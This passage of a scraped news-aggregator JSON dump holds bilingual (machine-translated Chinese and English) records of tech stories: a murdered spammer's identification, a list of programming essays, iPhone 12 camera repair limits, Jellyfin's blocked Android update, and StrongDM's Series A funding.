Greenbaum)，他多次更名，当记者追赶他寻找关于他的垃圾电子邮件帝国的报道时，他总是闪烁其词。\n他说，霍克和他的同事们吹嘘说，在大学辍学后，他们在垃圾邮件行业一年的收入高达30万美元。\n虽然IHIT表示，他们对霍克几乎一无所知，除了他去世时38岁，最初来自美国，麦克威廉姆斯已经收集了很多关于这位在波士顿富裕郊区长大的令人费解的年轻人的信息，他是一个国际象棋神童。\n麦克威廉姆斯采访了霍克和他的家人，了解到他小时候是如何因为个子小和犹太-而被欺负的，然后他拒绝了自己的犹太背景，把自己的名字改为霍克，不久之后就被反种族主义团体称为新纳粹分子。\n他把每个人都不如他的心态带入了他的余生，他说。\n1999年，他在华盛顿特区组织了一次失败的反政府游行，纽约时报和滚石杂志对他进行了报道。\n法庭文件显示，后来他利用自己的写作天赋欺骗人们给他寄现金，他的垃圾邮件业务开始起步。\n他是个骗子。他觉得他可以说服任何人购买草药伟哥，只需写一些聪明的电子邮件。麦克威廉姆斯说，这家伙非常聪明，他认为每分钟都有一个傻瓜出生--他真的很善于找到他们。\n2005年，互联网公司美国在线(AOL)在弗吉尼亚州联邦法院赢得了针对霍克的1280万美元判决，霍克被控向客户发送大量不需要的垃圾电子邮件，违反了联邦法律。霍克没有出席庭审。\n调查人员认为，他和他的合作伙伴从垃圾邮件推销中赚取了60多万美元。\n根据美国地区法院的文件，AOL还赢得了一项法院命令，要求挖出霍克亲属在马萨诸塞州拥有的两处房产，以收回成本，因为霍克曾经吹嘘过，他曾在院子里埋藏黄金和铂金。\n该公司最终决定不搜查这些房产，这些房产属于霍克的祖母和父母。\n周四，为AOL处理此案的律师告诉CBC每日新闻，他们追捕霍克多年，得知霍克偷偷登上拖网渔船，在伯利兹呆了一段时间，从而逃离了美国北部。\n在逮捕令到期后，搜索结束了。但据霍克的家人说，他继续像逃犯一样生活，再也没有回家。\n麦克威廉姆斯说，他一直在想，有一天霍克会不会安定下来，卖保险，但他说，听起来他似乎还是个狂野的人。\n霍克的叔叔罗利·戴维斯(Raleigh Davis)说，他侄子的死讯于上周通知了霍克的家人。他说，20年来没有人见过霍克，确认他的死亡至少提供了一些了结。\n戴维斯说，他真的很聪明，在很多方面都非常聪明，真的很自信。但我认为他有非常不安全的一面。\n任何对霍克之死有更多信息的人，如果想保持匿名，请致电IHIT中心1-877-551-4448，或发送电子邮件ihitinfo@rcmp-grc.gc.ca，或致电犯罪阻止人员1-800-222-8477。", "note_en": "British Columbia    Davis Wolfgang Hawke, found dead near Squamish, B.C., in 2017, was a known neo-Nazi and email spammer\n  More than three years after his death, a man who was shot dead and found in a burnt-out SUV near Squamish, B.C., has been identified as a U.S. citizen known for spreading racist, neo-Nazi ideologies and for a massive spam email campaign that led to a $12.8-million US lawsuit.\n  Police found Davis Wolfgang Hawke dead on the Cheekye Forest Road, off the Sea to Sky Highway east of Paradise Valley, around 9:30 a.m. on June 14, 2017. Officers had been called about a burnt, red 2000 GMC Yukon XL on the side of the road.\n   An autopsy later confirmed the man had been shot dead, but for years the RCMP could not confirm his real name.\n  The Integrated Homicide Investigation Team (IHIT) only knew he went by the alias Jesse James, and that he was well known as an avid climber in Squamish, which is around 50 kilometres north of Vancouver.\n  But with IHIT&#39;s confirmation of his identity on Thursday, details about Hawke&#39;s past — including his fascist sympathies and a lucrative spam empire he built hawking loans, pornography, jewelry and prescription drugs — have come to light thanks to the work of an investigative journalist.\n    Brian McWilliams, author of the book  Spam Kings, spent years tracking the young man, who he says lived a nomadic, risk-taking existence. He often travelled with half-wolf dogs, which were the only thing he appeared to be loyal to, according to McWilliams.\n  &#34;It doesn&#39;t surprise me that this guy died in an inglorious and maybe a violent way. He was always living on the edge,&#34; McWilliams said.\n    McWilliams said Hawke, born Andrew Britt Greenbaum, changed his name many times and was evasive when the journalist was chasing him for a story on his junk-email empire.\n  He said Hawke and his associates bragged about making up to $300,000 in a year in the spam business, after dropping out of college.\n    While IHIT said they had little information on Hawke, other than he was 38 when he died and was originally from the U.S., McWilliams has gathered a lot of information about the &#34;puzzling&#34; young man who grew up in an affluent Boston suburb and was a chess prodigy.\n  McWilliams, who interviewed Hawke and his family, learned how he was bullied as a child for being small and Jewish — before he rejected his Jewish background, changed his name to Hawke and soon after became known to anti-racism groups as a neo-Nazi.\n    &#34;He brought that mentality of everybody being inferior to him into the rest of his life,&#34; he said.\n  He organized a failed anti-government march in Washington, D.C., in 1999, and was written about in the New York Times and Rolling Stone magazine.\n    Later he used his writing talents to trick people into sending him cash, and his spam email venture took off, according to court documents.\n  &#34;He was a con man. He felt that he could convince anybody to buy herbal Viagra, just writing some clever email text. This guy was super intelligent and thought there was a sucker born every minute — and he was real good at finding them,&#34; said McWilliams.\n    In 2005, internet company AOL won a $12.8-million US judgment in federal court in Virginia against Hawke, who was accused of breaking federal law by sending massive amounts of unwanted spam emails to its customers. Hawke never showed for the trial.\n  Investigators believed he and his partners earned more than $600,000 on the spam sales pitches.\n  AOL also won a court order to dig up two properties owned by Hawke&#39;s relatives in Massachusetts to recoup costs, because Hawke had once bragged he buried gold and platinum in the yards, according to U.S. district court documents.\n  The company ultimately decided not to search the properties, which belonged to Hawke&#39;s grandmother and parents.\n        Lawyers who worked on the case for AOL told CBC News on Thursday they hunted Hawke for years, and learned he&#39;d escaped the U.S. by sneaking on board fishing trawlers, spending time in Belize.\n  After warrants for his arrest expired, the search wound down. But Hawke kept living like a fugitive and never returned home, according to his family.\n    McWilliams said he always wondered if Hawke would settle down one day and &#34;sell insurance,&#34; but said, &#34;It sounds like he stayed kind of a wild man.&#34;\n  Hawke&#39;s uncle Raleigh Davis said his nephew&#39;s death was communicated to the family last week. He said nobody had seen Hawke in 20 years, and confirmation of his death at least offered some closure.\n  &#34;He was really smart and really clever and really confident in a lot of ways. I think he had a really insecure side, though,&#34; said Davis.\n    Anyone with more information about Hawke&#39;s death is asked to phone IHIT at 1-877-551-4448 or email ihitinfo@rcmp-grc.gc.ca or call Crime Stoppers at 1-800-222-8477 if they want to remain anonymous.", "posttime": "2020-11-01 06:38:31", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "suv,victim,霍克", "title": "在烧毁的SUV中发现凶杀案受害者ID为垃圾邮件帝国背后的人", "title_en": "Homicide victim found in burnt-out SUV ID'd as man behind spam-email empire", "transed": 1, "url": "https://www.cbc.ca/news/canada/british-columbia/davis-wolfgang-hawke-missing-dead-1.5782107", "via": "", "real_tags": ["suv", "victim", "霍克"]}, {"category": "", "categoryclass": "", "imagename": "0a8f1c493ac8e56198471312bf491773.png", "infoid": 1032551, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "编程是一场抽象的游戏，我们程序员交流思想，当我找到一个能引起我共鸣的想法时，我就会成为每个与我一起工作的人的布道者。\n这里有一些我最喜欢的。有一种新近的偏见；我记不起我早年做程序员时的一些具有形成性的文章了。\n杰夫·阿特伍德，编程的第一条规则：总是你的错。我喜欢回答关于堆栈溢出的问题，在这个网站上有大量的问题，标题是“在Reaction中发现一个bug？”配上一句开场白：“我是全新的反应。”人类会认为你的工具或材料有问题。对我来说，这篇文章的观点是，假设相反的情况更有利可图，因为您的代码没有经受住任何来自流行软件项目的代码的审查。\n如果你真的渴望成为一名谦逊的程序员，你应该毫不犹豫地说“嘿，这是我的错--我会查个水落石出的。”--杰夫·阿特伍德。\n王肖恩，公开学习。公之于众，利用别人的鼓励和批评，在互联网上建立自己的足迹。作为初级开发人员，您可以走很多弯路，这些弯路既浪费时间，又有可能使您成为专家初学者；其中之一就是为了避免批评而隐藏您的工作。我认为这一论点最有说服力的部分可以用一句谚语来概括：“获得问题正确答案的最快方法是把错误的答案发布在互联网上。”\n人们认为你很差劲？好的。你同意。让他们详细地解释一下你为什么差劲。你只想感觉良好还是想做个好人？没有异议，没有伤害感情。那就走开，证明他们是错的。--王肖恩。\n伊丽莎白·亨德里克森，“动量与紧迫感”。我最近发现了这个帖子，它描述了我合作过的最好的团队。有效的团队注重过程，而不是结果。这类团队的经理们知道，团队成员被屏蔽并不是该团队成员必须补救的令人沮丧的细节，而是一个过程失败，幸运地暴露了出来，而更多的人隐藏了起来。他们会利用他们的管理影响力与你一起对抗这一障碍，并将其视为重中之重。\n我学到的是，如果我们想让事情进展得更快，气势感要比紧迫感有效得多。--伊丽莎白·亨德里克森(ElisElizabeth Hendrickson)\nScott Hanselman，他们配得上你击键的礼物吗？这篇文章不仅仅是给程序员的，它的统计性质也引起了我的共鸣。自从读了它，我经常会考虑我选择的沟通方式的范围，以及我是否有效地利用了时间。\n假设你想让你的信息到达尽可能多的人手中，那就把它写到博客上。你一天只有那么几个小时。--斯科特·汉塞尔曼(Scott Hanselman)。\n乔尔·斯波尔斯基，“冰山秘诀”，“揭秘”。程序员知道，我们在网页上看到的东西可能代表了应用程序真正的功能、完整性和复杂性的一小部分，或者根本没有。不写软件的人不会自动知道这一点。在所有的交流中都要考虑到这一点。\n顾客不知道他们想要什么。不要指望顾客知道他们想要什么。这是永远不会发生的。忘了它吧-乔尔·斯波尔斯基。\n要知道，你在黑暗的房间里用投影仪做的任何演示都是关于像素的。如果可以的话，构建你的用户界面，让未完成的部分看起来像是未完成的。--乔尔·斯波尔斯基(Joel Spolsky)。\nXY问题。当你向某人寻求编程帮助时，首先让他们适应你的情况，陈述问题、你的假设以及你尝试和学到的东西。给他们机会在你的逻辑上打洞。\n记住，如果你的诊断理论是准确的，你就不会寻求帮助，对吗？\n乔恩·埃文斯，为什么新来的家伙不会编程。这一论点的真实性一次又一次地向我证实。我想我在这份工作中成为了一名程序员。但是你现在只需要做一件困难的事情就可以成为一名程序员：致力于一个有意义的项目，无论多么小，并不顾你将面临的障碍完成它。\n那么，真正的面试应该包括哪些内容呢？让我提供一个谦虚的建议：不要采访任何没有成就的人。永远不会。证书和学位不是成就，我指的是有真实用户的真实世界项目。--乔恩·埃文斯。\nZed Shaw通过Abhishek Nagekar，来自一位老程序员的建议。很可能有一天你会发现编程有点无聊。它将不再作为一种纯粹的锻炼而感到快乐。那你会怎么做？这是一个我正在努力解决的问题。我选择使用这种技能来构建我关心的东西，并通过志愿服务帮助其他人成为程序员。\n作为一种职业，编程只是一种中等程度的趣味性。这可能是一份不错的工作，但你可以赚同样的钱，而且开一家快餐店会更开心。你最好在另一种职业中使用代码作为你的秘密武器。--泽德·肖(Zed Shaw)。\n我计划在我继续阅读的同时更新这份清单。把你不断返回的文章通过推特发给我！", "note_en": "Programming is a game of abstractions, and we programmers traffic in ideas.When I find an idea that resonates with me, I turn into an evangelist for it toeveryone who works with me.\n Here are some of my favorites. There’s a recency bias; I can’t remember some ofthe formative essays from my early years as a programmer.\n   Jeff Atwood,  The First Rule of Programming: It’s Always Your Fault. Ilike to answer questions on Stack Overflow, and an amazing amount of questionson that website have a title like “Found a bug in React?” paired with anintroductory sentence: “I’m brand new to React.” It’s human to assume there’s aproblem with your tools or materials. To me, this essay’s point is that it’smore profitable to assume the opposite, because your code hasn’t stood up toanything close to the scrutiny of the code from a popular software project.\n If you truly aspire to being a humble programmer, you should have no qualmsabout saying “hey, this is my fault— and I’ll get to the bottom of it.”— Jeff Atwood\n  Shawn Wang,  Learn in Public. Be public, leverage the encouragement andcriticism of others, and build a footprint for yourself on the internet. Thereare a bunch of detours you can take as a junior developer that waste time andpotentially graduate you to  expert beginner status; one ofthem is hiding your work in an attempt to avoid criticism. I think one of thesmartest parts of argument this can be summed up in the adage: “The fastest wayto get the right answer to a question is to post the wrong answer on theinternet.”\n People think you suck? Good. You agree. Ask them to explain, in detail, whyyou suck. You want to just feel good or you want to be good? No objections, nohurt feelings. Then go away and prove them wrong.— Shawn Wang\n  Elisabeth Hendrickson,  Momentum &gt;Urgency. I found this postrecently, and it describes the best teams I’ve worked with. Effective teamsfocus on process, not outcome. Managers of such teams know that a team memberbeing blocked isn’t a frustrating detail that that team member will have toremedy, but rather a process failure that was luckily exposed while many moreremain hidden. They’ll use their managerial clout to fight with you againstthat obstacle, considering it a top priority.\n What I’ve learned is that if we want things to go fast, a sense of momentumis much more effective than a sense of urgency.— Elisabeth Hendrickson\n  Scott Hanselman,  Do they deserve the gift of yourkeystrokes?.This post isn’t just for programmers, but the statistical nature of itresonated with me. Since reading it, I often consider the reach of my chosencommunication method, and whether I’m making efficient use of time.\n Assuming you want your message to reach as many people as possible, blog it. You only have so many hours in the day.— Scott Hanselman\n  Joel Spolsky,  The Iceberg Secret,Revealed.Programmers know that what we can see on a web page can represent a smallfraction or none of the true functionality, completeness, and complexity of theapplication. People who don’t write software don’t automatically know that.Factor this into all communication.\n Customers Don’t Know What They Want. Stop Expecting Customers to Know WhatThey Want. It’s just never going to happen. Get over it.— Joel Spolsky\n Understand that any demos you do in a darkened room with a projector aregoing to be all about pixels. If you can, build your UI in such a way thatunfinished parts look unfinished.— Joel Spolsky\n  XY Problem. When you’re asking for programming helpfrom someone, start by easing them into your situation, stating the problem,your assumptions, and what you’ve tried and learned. Give them the chance topoke holes in your logic.\n Remember that if your diagnostic theories were accurate, you wouldn’t be asking for help right?\n  Jon Evans,  Why The New Guy Can’tCode. The truthof this argument has confirmed itself to me over and over again. I think that Ibecame a programmer on the job. But you can become a programmer right now bydoing just one hard thing: committing to a meaningful project, no matter howsmall, and finishing it, in spite of the obstacles you will face.\n So what should a real interview consist of? Let me offer a humble proposal:don’t interview anyone who hasn’t accomplished anything. Ever. Certificates anddegrees are not accomplishments; I mean real-world projects with real-worldusers.— Jon Evans\n  Zed Shaw via Abhishek Nagekar,  Advice From An Old Programmer. There willlikely come a day when you find programming to be a little bit boring. It willcease to be joyful as a pure exercise. What do you do then? It’s a question I’mgrappling with. I’m choosing to use that skill to build things I care about,and help others become programmers through volunteering.\n Programming as a profession is only moderately interesting. It can be a goodjob, but you could make about the same money and be happier running a fast foodjoint. You’re much better off using code as your secret weapon in anotherprofession.— Zed Shaw\n  I plan to keep this list updated as I continue to read. Send me the essays youkeep returning to via  Twitter!", "posttime": "2020-11-01 06:11:04", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "编程,programming,文章", "title": "关于编程的文章我想了很多", "title_en": "Essays on Programming I Think About a Lot", "transed": 1, "url": "https://www.jakeworth.com/essays-on-programming-i-think-about-a-lot/", "via": "", "real_tags": ["编程", "文章"]}, {"category": "", "categoryclass": "", "imagename": "33b021650b36d1fdee7d60ea781b95e6.jpg", "infoid": 1032550, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "IFixit发现，在没有苹果专有工具的情况下，无法维修或更换iPhone12摄像头，而苹果专有工具只能由该公司授权的技术人员使用。\n该公司表示，这似乎阻止了在家以及无法访问在线软件工具…的第三方公司进行自助维修。\nIFixit在试图在手机之间交换iPhone12摄像头模块时发现了这个问题。苹果的文件随后证实了它的怀疑。\n经过详尽的测试，与多名维修技术人员比较笔记，以及审查泄露的苹果培训文件，我们发现iPhone12摄像头在iPhone之间交换时完全不可靠。\n这一最新的故障，加上苹果维修指南中的迹象，比以往任何时候都更加清楚：苹果，无论是设计还是疏忽，或者两者兼而有之，使得没有他们的支持，修理iPhone变得极其困难。这可能是苹果最终修复的一个漏洞。在手机之间交换iPhone部件时，甚至有过行为不端的先例。\n但苹果也有可能计划将所有未经授权的iPhone摄像头和屏幕维修拒之门外。苹果的内部培训指南告诉授权的技术人员，从12及其变种开始，他们将需要运行苹果专有的云连接系统配置应用程序来全面维修摄像头和屏幕。\nIPhone12摄像头，当转移到另一台iPhone12上时，似乎可以在发布时使用，但在实际使用中却出现了严重的故障。它拒绝切换到超宽相机，只对某些相机模式作出响应，偶尔会挂起，完全没有反应。\n苹果的一份培训指南证实了这个问题，该指南通知技术人员，他们需要运行苹果专有的云连接系统配置应用程序，才能进行摄像头维修或更换。这是对iPhone 12的新要求。\n虽然文件中说屏幕维修也需要该工具，但iFixit称这只是部分正确--更换的屏幕可以工作，但你确实会收到警告，指出它可能不是真的(尽管它是真的)。\nTouch ID和Face ID之前也出现过同样的问题，因为这些模块链接到Secure Enclave芯片。目前尚不清楚为什么后置摄像头模块需要以同样的方式进行验证，这似乎可能会增加围绕苹果对维修权的态度的争议。\n您正在阅读的是朝九晚五的Mac--日复一日地发布有关苹果及其周边生态系统的新闻的专家们。请务必查看我们的主页以获取所有最新新闻，并在Twitter、Facebook和LinkedIn上关注9to5Mac以随时了解最新消息。不知道从何说起？查看我们的独家故事、评论、操作指南，并订阅我们的YouTube频道", "note_en": "iFixit has found that an  iPhone 12 camera repair or replacement cannot be made without access to a proprietary Apple tool which is only available to technicians authorized by the company.\n The company says this appears to prevent DIY repairs at home, as well as those by third-party companies who do not have access to the online software tool …\n  iFixit  discovered the problem when it tried to swap iPhone 12 camera modules between phones. Its suspicion was then confirmed by Apple documentation.\n After exhaustive testing, comparing notes with multiple repair technicians, and reviewing leaked Apple training documents, we’ve found that the iPhone 12 camera is entirely unreliable when swapped between iPhones.\n This latest fault, along with indications from Apple’s repair guides, makes it more clear than ever: Apple, by design or neglect or both, is making it extremely hard to repair an iPhone without their blessing. This may be a bug that Apple eventually fixes. There is even precedent for iPhone parts misbehaving when swapped between phones.\n But it is also possible that Apple is planning on locking out all unauthorized iPhone camera and screen repairs. Apple’s internal training guides tell authorized technicians that, starting with the 12 and its variants, they will need to run Apple’s proprietary, cloud-linked System Configuration app to fully repair cameras and screens.\n  The iPhone 12 camera, when transferred to another iPhone 12, appears to work on launch, but fails miserably in actual use. It refuses to switch to the ultrawide camera, responds only to certain camera modes, and occasionally hangs and becomes completely unresponsive.\n The issue was confirmed by an Apple training guide, which informs technicians that they will need to run Apple’s proprietary, cloud-linked System Configuration app in order to carry out camera repairs or replacements. This is a new requirement for the iPhone 12.\n  Although the document says that the tool is also needed for screen repairs, iFixit says that is only partly true – the replacement screen works, but you do get a warning that it may not be genuine (even though it is).\n The same issue was  previously seen with Touch ID and Face ID, as these modules are linked to the Secure Enclave chip. It’s unclear why rear camera modules would need to be verified in the same way, and seems likely to add to the controversy surrounding Apple’s attitude to  the right to repair.\n  You’re reading 9to5Mac — experts who break news about Apple and its surrounding ecosystem, day after day. Be sure to check out  our homepage for all the latest news, and follow 9to5Mac on  Twitter,  Facebook, and  LinkedIn to stay in the loop. Don’t know where to start? Check out our  exclusive stories,  reviews,  how-tos, and  subscribe to our YouTube channel", "posttime": "2020-11-01 06:10:55", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "apple,苹果,iphone,finds,维修", "title": "IFixit发现如果没有苹果专有工具，iPhone 12摄像头维修是不可能的", "title_en": "iFixit finds iPhone 12 camera repair impossible without proprietary Apple tool", "transed": 1, "url": "https://9to5mac.com/2020/10/30/iphone-12-camera-repair/", "via": "", "real_tags": ["apple", "苹果", "iphone", "finds", "维修"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1032549, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "大家好。我的名字是安东尼，我是Jellyfin核心团队的一员。我每天做的众多事情之一就是发布我们客户端应用程序的更新。这意味着我与Apple、Roku、Amazon和Google进行交互，分别针对它们各自的商店。通常这是一个相当顺利的过程，虽然很耗时。我可以提交应用程序，通常延迟很小。\n我们最近发布的Android客户端应用程序是个例外。在加入Android Auto时，我预计审查期会更长，但出现了一些重大问题。首先，在提交之前，您必须同意一组特定的条款。这不是问题，只有几段要读，还有一个复选框。然而，一旦提交，问题就开始了。\n我们的应用程序目前被禁止发布，因为谷歌表示他们无法对其进行测试。\n提交审核后，我们很快就收到了我们的应用被拒绝的政策通知。当我看这条信息时，它写道：\n如果没有测试登录帐户，我们将无法测试您的应用程序的自动功能。请使用测试帐户登录信息回复此电子邮件，并通过您的开发人员控制台提交您的应用程序以供重新审查。\n这听起来很合理。我以前不得不提供测试账户(亚马逊已经测试了我发送给他们的每一个版本)。为此，我们有一台专用的演示服务器。这是谷歌首次要求提供登录信息。(有趣的事实：他们曾经屏蔽了我们，因为我们需要证明我们获得了使用Jellyfin这个名字的许可。)。\n这有一个问题：电子邮件来自一个没有回复的地址。如果我回复它，我会得到一个自动回复，告诉我它将不会被接收。那我该怎么给他们提供登录信息呢？\n我搜索了他们的帮助文档，向Login Info提交了上诉，但没有得到回应。样板回复说他们会在48小时内给我回电话。我等着，在没有进一步行动的情况下，我联系了他们的开发人员帮助。他们说他们看到了我的案子，会把它转发给正确的团队。我试着重新提交(我们修复了一个错误)，又等了48小时，没有反应。\n我终于找到了游戏控制台的一部分，其中有一个区域可以提供登录步骤和信息。我填了所有正确的数据，但他们还是拒绝了。昨晚，我再次与某人进行了一次支持聊天，因为我的另一次更新再次被拒绝。聊天持续了30多分钟，代表确认他可以看到我提供了登录信息，但无法解释我被拒绝的原因。他试图给我几个不同的借口。首先是缺乏列出的隐私政策。嗯，这不是我们被拒绝的原因，以前也没有阻止过我们。不过，我还是提供了一个。第二个问题是关于目标API水平。嗯，这项政策要到11月2日才生效。最后，他要了我的联系方式，在我还没来得及回复之前就结束了聊天。\n在此问题得到解决之前，我们将无法在商店中获得此应用程序。这里有两条可能的前进路线。我们要么退出Android Auto并稍后再试，要么以某种方式将其发布。我希望我们不必撕毁为此所做的工作，但在这一点上可能会到那一步。\n我们唯一的问题是--你知道谷歌有谁能帮上忙吗？我试过按规则办事，但没有奏效。", "note_en": "Hi all. My name is Anthony and I&#39;m part of the Core Team with Jellyfin. One of the many things I do on a daily basis is deal with releasing updates to our client apps. This means I interact with Apple, Roku, Amazon, and Google, for each of their respective stores. Normally this is a pretty smooth, although time consuming process. I am able to submit apps, and there is normally very little delay.\n Our most recent Android client app release has been an exception. At the inclusion of Android Auto, I expected a longer review period, but there have been significant issues. First, there is a specific set of terms you must agree to before you can submit. That was no issue, just a few paragraphs to read and a checkbox. Once submitted however, the issues began.\n Our app is currently being blocked from publishing, because Google says they can&#39;t test it.\n After submitting for review, we quickly got a policy notification that our app was rejected. When I looked at the message, it stated this:\n We&#39;re not able to test your app for Auto functionality without a test login account. Please respond back to this email with test account login information and submit your app for re-review through your Developer Console.\n That sounds reasonable enough. I&#39;ve had to provide test accounts before (Amazon has tested every release I&#39;ve ever sent to them). We have a dedicated demo server for this purpose. This is the first time Google has asked for login info. (Fun fact: they once blocked us because we needed to prove we had permission to use the name Jellyfin.)\n There&#39;s one issue with this: the e-mail came from a &#34;No Reply&#34; address. If I reply to it, I get an automated reply back that it will not be received. How am I supposed to provide them with login info then?\n I scoured their help documentation, submitted an appeal with Login Info, yet there was no response. The boilerplate response says they&#39;ll get back to me within 48 hours. I waited, and with no further action happening, I contacted their Developer Help. They said they saw my case and would forward it to the correct team. I tried resubmitting (we had a bug fix), and waited another 48 hours, with no response.\n I finally found a section of the Play Console that had an area to provide login steps and information. I filled it in with all the correct data, and yet they still reject it. I was in a support chat with someone again last night, after getting rejected yet again with another update. The chat lasted over 30 minutes, where the representative confirmed he could see that I had provided login info, but could not explain why I was getting rejected. He tried to give me a few different excuses. First was a lack of listed Privacy Policy. Well, that&#39;s not the reason we were rejected and it hasn&#39;t stopped us before. Still, I provided one. The second was about target API levels. Well, that policy doesn&#39;t take effect until November 2nd. Eventually he asked for my contact info and ended the chat before I could respond further.\n   Until this gets sorted, we won&#39;t be able to get this app on the store. There are two possible routes forward here. We either pull out Android Auto and try again later, or we somehow get this published. I hope we don&#39;t have to rip out the work that was done for this, but it may come to that at this point.\n Our only question - Do you know anyone at Google who can help? I&#39;ve tried playing by the rules, and it just hasn&#39;t worked.", "posttime": "2020-11-01 06:10:33", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "google,谷歌,android,屏蔽,update", "title": "Android更新被谷歌屏蔽：jellyfin", "title_en": "Android Update blocked by Google: jellyfin", "transed": 1, "url": "https://www.reddit.com/r/jellyfin/comments/jll3jm/android_update_blocked_by_google/", "via": "", "real_tags": ["google", "谷歌", "android", "屏蔽", "update"]}, {"category": "", "categoryclass": "", "imagename": "a86f74169afb815fa68fb2fadc6f6108.jpg", "infoid": 1032548, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "StrongDM是一家面向后端基础设施的单点登录公司，该公司今天宣布，它已经在红杉资本(Sequoia Capital)牵头的首轮融资中筹集了1700万美元。\n联合创始人兼首席执行官伊丽莎白·扎尔曼(Elizabeth Zalman)表示，过去，为了让员工访问基础设施，公司将Active Directory放在一个数据库的顶部，只有少数人(特权管理员或系统管理员)可以访问它。随着云的兴起，越来越多的数据存放在更多的地方，越来越多的人需要访问云，这些控制访问的传统方法不再起作用。\nZalman说：“如果您要管理可能位于数据中心或云中的基础设施的访问，您需要能够处理每个云、每个数据库或服务器类型，并且您需要在一个任何人都可以采用的简单直观的界面中完成这项工作。”StrongDM使管理员和管理基础架构的人员能够管理和审核对该基础架构的访问，无论该基础架构位于何处，也不管需要访问该基础架构的人员位于何处。\nStrongDM的工作方式不是提供用户名或密码，而是用户将一个软件下载到他们的计算机上。然后，他们可以登录，通过单点登录提供商(如Okta或OneLogin)进行身份验证，一旦用户被授予访问权限，他们就有了一个他们可以访问的资源列表。\nStrongDM授予访问权限、进行调解，并在视频回放中记录开发人员正在做的每一件事。\n“我们让你进入前门，让你接触到你需要的小东西，然后观察你在做什么，”扎尔曼说。\nStrongDM只提供一个套餐，每个用户每月收费50美元。该公司在过去一年中增长了3倍，拥有100名客户，其中包括赫斯特(Hearst)、索菲(SoFi)和佩洛顿(Peloton)等公司。\n在联合创立StrongDM之前，扎尔曼于2010年与人共同创立了数字营销平台Media Armor，并于2014年将其出售给诺米，此前她筹集了两轮资金(包括由Greycroft牵头的200万美元首轮融资)。扎尔曼于2015年与高中时的朋友贾斯汀·麦卡锡(Justin McCarthy)以及诺米(Nomi)前营销副总裁舒勒·布朗(Schuyler Brown)(客户成功副总裁)共同创立了StrongDM。\n红杉资本(Sequoia Capital)全球管理合伙人、亿万富翁道格拉斯·里昂(Douglas Leone)领导了首轮A轮融资，他表示，各地的数据库越来越多，员工越来越多，这使得大公司更难跟踪谁有权访问哪些内容。\nLeone说：“随着越来越多的人能够更多地访问不同的数据库或服务器，您无法手动跟踪所有这些内容，因此您需要的是自动化系统。”“我们看到，当问题只会变得更糟时，Strong DM的解决方案将针对未来。”\n这家总部位于伯灵格姆的公司目前拥有35名员工，此前已通过一轮种子前融资和一轮种子融资筹集了500万美元。加上最新的1,700万美元首轮融资，该公司的股权融资总额已增长至2,200万美元。", "note_en": "StrongDM, a single sign-on company for backend infrastructure, announced today that it has raised $17 million in Series A led by Sequoia Capital.\n  Cofounder and CEO Elizabeth Zalman says that back in the day in order for an employee to get access to infrastructure, companies had active directory sitting on top of one database and only a few people had access to it (privileged administrators or systems administrators). With the rise of the cloud and the explosion of more data sitting in more places and  more people needing access to it, these traditional approaches to control access stopped working.\n  “If you’re going to manage access for infrastructure that could be sitting in the data center or a cloud, you need to be able to handle every cloud, every database or server type, and you need to do it in one simple intuitive interface that anybody can adopt,” Zalman says. “StrongDM enables administrators and people who manage infrastructure to both manage and audit access to that infrastructure, no matter where it is and no matter where the people that need access to it are.”\n    The way strongDM works is instead of handing out usernames or passwords, users download a piece of software to their computer. They are then able to log in, get authenticated through single sign-on provider (like Okta or OneLogin), and once the user has been granted access they have a list of resources that they get access to.\n   StrongDM grants the access, mediates it, and also logs every single thing that the developer is doing in a video replay.\n  “We get you in the front door, we get you access to the small thing that you need and then watch what you’re doing,” Zalman says.\n    StrongDM offers only one plan which costs $50 per user per month. The company has grown 3x over the last year, and counts 100 customers, including names like Hearst, SoFi, and Peloton.\n    Prior to cofounding strongDM, Zalman cofounded digital marketing platform Media Armor in 2010, which she sold to Nomi in 2014, after raising two rounds (including a $2 million Series A led by Greycroft). Zalman cofounded strongDM in 2015 with her friend from high school Justin McCarthy (CTO), and the ex-VP of marketing at Nomi, Schuyler Brown (VP of Customer Success).\n  Billionaire  Douglas Leone, global managing partner at Sequoia Capital, who led the Series A round says that there are more and more databases and lots of employees all over the place, which makes it harder for large companies to keep track of who has access to what.\n  “As more people have more access to different databases or servers you can’t keep track of all this manually, so what you need is automated systems,” Leone says. “We saw that strongDM’s solution would be aimed at the future when the problem is only going to get worse.”\n  The Burlingame-based company, which currently counts 35 employees, has previously raised $5 million across a pre-seed and a seed round. With the latest latest $17 million Series A, the total amount of equity financing in the company has grown to $22 million.", "posttime": "2020-11-01 05:47:01", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "user,访问", "title": "StrongDM允许和调解用户访问企业后端基础设施，并在视频回放中记录用户操作，该公司筹集了1700万美元的首轮融资，由红杉资本(Sequoia)牵头", "title_en": "StrongDM, which grants and mediates user access to enterprise backend infrastructure and logs user actions in video replay, raises $17M Series A led by Sequoia", "transed": 1, "url": "https://www.forbes.com/sites/igorbosilkovski/2020/10/27/tech-company-strongdm-which-manages-and-audits-access-raises-17-million-in-series-a-round-led-by-sequoia-capital/", "via": "", "real_tags": ["user", "访问"]}, {"category": "", "categoryclass": "", "imagename": "9f21559fc1421273409a1dcec83d760e.jpg", "infoid": 1032547, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": 